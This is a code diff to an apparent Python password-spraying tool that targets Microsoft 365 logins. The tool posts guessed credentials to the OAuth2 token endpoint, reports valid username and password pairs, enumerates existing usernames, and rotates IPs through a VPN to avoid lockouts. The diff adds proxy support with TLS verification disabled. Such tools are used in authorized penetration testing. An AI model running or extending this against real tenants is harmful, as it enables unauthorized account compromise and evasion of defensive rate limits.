@@ -28,6 +28,7 @@ parser.add_argument("--url", default="https://login.microsoft.com", help="The UR
 parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password")
 parser.add_argument("-s", "--sleep", default=0, type=int, help="Sleep this many seconds between tries")
 parser.add_argument("--vpn", action=argparse.BooleanOptionalAction, help="Use nord vpn to rotate IP")
+parser.add_argument("-x", "--proxy", help="HTTP/HTTPS proxy address.")
 
 args = parser.parse_args()
 
@@ -38,6 +39,13 @@ out = args.out
 verbose = args.verbose
 sleep = args.sleep
 vpn = args.vpn
+
+proxies = {}
+verify = True
+if args.proxy:
+    verify = False
+    requests.packages.urllib3.disable_warnings() 
+    proxies = { "http" : args.proxy, "https" : args.proxy }
 
 usernames = []
 with open(args.userlist, "r") as userlist:
@@ -83,7 +91,7 @@ for username in usernames:
         'Content-Type': 'application/x-www-form-urlencoded',
     }
 
-    r = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body)
+    r = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body, proxies=proxies, verify=verify)
 
     if r.status_code == 200:
         print(f"SUCCESS! {username} : {password}")
